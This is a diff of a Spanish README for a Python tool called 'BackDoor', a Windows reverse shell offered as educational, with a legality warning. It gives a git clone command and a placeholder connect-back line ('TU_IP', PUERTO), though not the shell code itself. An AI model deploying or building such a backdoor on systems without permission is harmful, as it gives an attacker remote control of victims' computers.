@@ -1,12 +1,10 @@
 # BackDoor 
 
 👤 AUTOR:
------------------------------------------------------------
 ⭐ Desarrollado por Hector Arango 
 🔗 Github: https://github.com/hmam13
 
 📋 DESCRIPCION:
------------------------------------------------------------
 BackDoor es una herramienta educativa diseñada para entender la comunicación 
 remota entre computadoras mediante una "Shell Inversa".
 
@@ -16,13 +14,11 @@ remota. Usa un "teléfono" (librería socket) para llamar y un "ayudante"
 resultados de vuelta. 🪟 Está optimizado para sistemas Windows.
 
 ⚠️ ADVERTENCIAS:
------------------------------------------------------------
 🛑 [!] Este script es exclusivamente para fines EDUCATIVOS.
 🚫 [!] No lo uses en computadoras ajenas sin permiso, ya que es ilegal.
 🛡️ [!] Úsalo solo en entornos controlados para aprender sobre ciberseguridad.
 
 🛠️ REQUISITOS:
------------------------------------------------------------
 1. Python 3 instalado.
 2. Librerías estándar (ya vienen con Python):
    - socket
@@ -30,11 +26,9 @@ resultados de vuelta. 🪟 Está optimizado para sistemas Windows.
 3. Conexión a internet o red local.
 
 📥 INSTALACION:
------------------------------------------------------------
 git clone https://github.com/hmam13/BackDoor
 
 🚀 MODO DE USO:
------------------------------------------------------------
 1. Abrir el archivo BackDoor.py y poner tu IP y el Puerto:
    socket_cliente.connect(("TU_IP", PUERTO))
 
